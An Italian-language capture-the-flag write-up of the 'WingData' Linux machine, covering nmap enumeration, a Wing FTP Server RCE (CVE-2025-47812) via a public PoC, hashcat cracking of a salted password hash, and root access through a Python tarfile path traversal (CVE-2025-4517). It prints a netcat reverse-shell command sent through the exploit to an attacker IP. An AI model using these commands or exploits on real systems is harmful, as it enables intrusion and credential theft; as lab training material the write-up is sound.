+++
date = '2026-07-21T16:13:09+02:00'
draft = false
title = 'WingData Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`24/02/2026`**

![WingData.png](/images/imgs_wingdata/WingData.png)

---
# Introduzione

**_WingData_** è una macchina **Linux** di livello **Easy** che offre un percorso di exploitation moderno. Il box inizia con una classica enumerazione web che porta ad un'istanza vulnerabile di **Wing FTP Server**, exploitata tramite una recente **CVE RCE**. Il lateral movement richiede di comprendere come l'applicazione salvi ed esegua il salting delle password, permettendo di craccare un hash e accedere via **SSH** all'account di un utente. Infine, la privilege escalation prevede l'abuso di una vulnerabilità di **path traversal** nel modulo **tarfile di Python** tramite uno script personalizzato, per inserire una **chiave SSH** nella directory di **root**.

---
# Tecniche Utilizzate

- **Wing FTP Server Exploitation (CVE-2025-47812)**

- **Password Hash Cracking**

- **Python tarfile Path Traversal Exploitation (CVE-2025-4517)**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- wingdata
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Scansione mirata con script e service detection:

```bash
nmap -sC -sV wingdata
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP (Apache/2.4.66)

## Enumerazione Web

Sulla porta **80** è hostato un sito web: "**Wing Data Solution**". 

![web.png](/images/imgs_wingdata/web.png)

Cliccando sul pulsante "**Client Portal**" sono stato reindirizzato a **`ftp.wingdata.htb`**.

![error.png](/images/imgs_wingdata/error.png)

L'ho aggiunto al mio file **`/etc/hosts`**.

Navigando su **`ftp.wingdata.htb`**, sono atterrato su una pagina di login del **Wing FTP Server Web Client**, che rivelava la sua versione esatta in basso: **`v7.4.3`**.

![ftp.png](/images/imgs_wingdata/ftp.png)

---
# Accesso Iniziale | Wing FTP RCE

Ho cercato online delle vulnerabilità che affliggessero **Wing FTP Server versione 7.4.3** e ho trovato rapidamente la **CVE-2025-47812**, una falla di **Remote Code Execution Non Autenticata**:

- **https://www.exploit-db.com/exploits/52347**

![exploit.png](/images/imgs_wingdata/exploit.png)

Ho scaricato il **PoC** in **Python** da **Exploit-DB** (**ID: 52347**) e l'ho testato.

```bash
python3 wing.py -u http://ftp.wingdata.htb -c whoami
```

![whoami.png](/images/imgs_wingdata/whoami.png)

Prima di procurarmi una shell, ho letto il file **`/etc/passwd`** e ho notato un utente chiamato **wacky**.

![passwd.png](/images/imgs_wingdata/passwd.png)

Ho provato alcuni payload comuni per una rev shell. L'unico che si è connesso con successo al mio listener è stato il classico **netcat** con la flag **`-e`**.

```bash
python3 wing.py -u http://ftp.wingdata.htb -c 'nc 10.10.16.77 22667 -e /bin/sh'
```

![initial_access.png](/images/imgs_wingdata/initial_access.png)

Ho ottenuto la shell e il mio foothold iniziale come service account **wingftp**.

---
# Lateral Movement | Password Cracking

Ho trovato diversi file di configurazione utente salvati in **`/opt/wftpserver/Data/1/users/`**. Avendo già notato in precedenza l'utente **wacky** nell'**`/etc/passwd`**, sapevo esattamente quale fosse il profilo da colpire. Ho aperto **`wacky.xml`** e ho estratto le credenziali hashate.

![hash.png](/images/imgs_wingdata/hash.png)

Ho consultato la documentazione ufficiale di **Wing FTP** per capire come venissero salvate le password. Viene utilizzato l'algoritmo **SHA-256** con un salt di default impostato a **WingFTP**, formattato come **`sha256($pass.$salt)`**.

- **https://www.wftpserver.com/help/ftpserver/index.html?compression.htm**

![salting.png](/images/imgs_wingdata/salting.png)

Facendo riferimento alla pagina ufficiale example_hashes di **Hashcat**, questo formato corrisponde al modulo **`1410`**.

- **https://hashcat.net/wiki/doku.php?id=example_hashes**

![hmode.png](/images/imgs_wingdata/hmode.png)

Ho salvato l'hash in **`pass.txt`** e ho lanciato **Hashcat**:

```bash
hashcat -m 1410 pass.txt /usr/share/wordlists/rockyou.txt
```

![pass.png](/images/imgs_wingdata/pass.png)

Ho usato queste credenziali per accedere via **SSH** alla macchina come **wacky** e ho preso la **user flag**.

```bash
ssh wacky@wingdata.htb
```

![userflag.png](/images/imgs_wingdata/userflag.png)

---
# Privilege Escalation | Python Tarfile CVE

Avendo accesso via **SSH** e una password valida, ho controllato subito i privilegi sudo.

```bash
sudo -l
```

![sudol.png](/images/imgs_wingdata/sudol.png)

**Nota**: _Lo script usa **`tar.extractall(filter="data")`**, che in teoria dovrebbe prevenire attacchi di **path traversal**. Tuttavia, la **CVE-2025-4517** bypassa questa specifica protezione abusando dei symlink e dei limiti di percorso (**`PATH_MAX`**), permettendoci di evadere dalla cartella di destinazione e scrivere la nostra **chiave SSH** direttamente in **`/root/.ssh/`**._

Inizialmente ho provato a usare un **PoC** pubblico creato da **0xDTC**:

- **https://github.com/0xDTC/CVE-2025-4517-tarfile-PATH_MAX-bypass**

Ma continuava a fallire. Tuttavia, effettuare il debugging mi ha aiutato a capire a fondo come funzionasse realmente la vulnerabilità.

![privescfail.png](/images/imgs_wingdata/privescfail.png)

Quindi, ho trovato un altro script fornito dal team di **Google Security Research** e l'ho modificato manualmente per adattarlo a questo scenario. Ho sistemato il payload per includere la mia chiave pubblica e ho aggiustato il percorso di traversal:

- **https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f**

**Snippet dello script modificato**:

![script1.png](/images/imgs_wingdata/script1.png)
![script2.png](/images/imgs_wingdata/script2.png)

Ho salvato lo script modificato come **`mal.py`** all'interno della directory **`/opt/backup_clients/backups`**, ho generato il file tar malevolo e ho eseguito il comando **sudo** vulnerabile:

```bash
python3 mal.py
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1.tar --restore-dir restore_1
```

![privesc.png](/images/imgs_wingdata/privesc.png)

Lo script ha rilasciato silenziosamente la mia **chiave SSH** all'interno della directory di **root**. Sono entrato semplicemente in **SSH** nella macchina come **root** e ho preso la flag finale.

```bash
ssh root@wingdata.htb
```

![rootflag.png](/images/imgs_wingdata/rootflag.png)

**Nota**: _Dopo aver completato la macchina, ho deciso di fare troubleshooting sul **PoC** iniziale di **0xDTC** che non aveva funzionato. Ho capito che lo script di per sé era funzionante; stavo semplicemente passando il valore sbagliato al parametro **`DEPTH_TO_ROOT`**. A prescindere da questo, riscrivere e modificare lo script del **Google Security Research** da zero è stata un'esperienza formativa di gran lunga superiore per comprendere davvero come funzioni la vulnerabilità del modulo tarfile._

---
# Considerazioni Finali

**_WingData_** è una macchina che premia le buone capacità di ricerca e adattamento. La **RCE** in **Wing FTP** è un foothold moderno. La privilege escalation è sicuramente il punto forte del box, in quanto ti costringe a comprendere profondamente la vulnerabilità di **path traversal** invece di lanciare ciecamente exploit pubblici.

**Fonti**:

- **Wing FTP Server CVE-2025-47812 PoC | https://www.exploit-db.com/exploits/52347**

- **Wing FTP Password Salting Documentation | https://www.wftpserver.com/help/ftpserver/index.html?compression.htm**

- **Hashcat example_hashes | https://hashcat.net/wiki/doku.php?id=example_hashes**

- **Python tarfile CVE-2025-4517 PoC (0xDTC) | https://github.com/0xDTC/CVE-2025-4517-tarfile-PATH_MAX-bypass**

- **Python tarfile CVE-2025-4517 Advisory (Google Security Research) | https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f**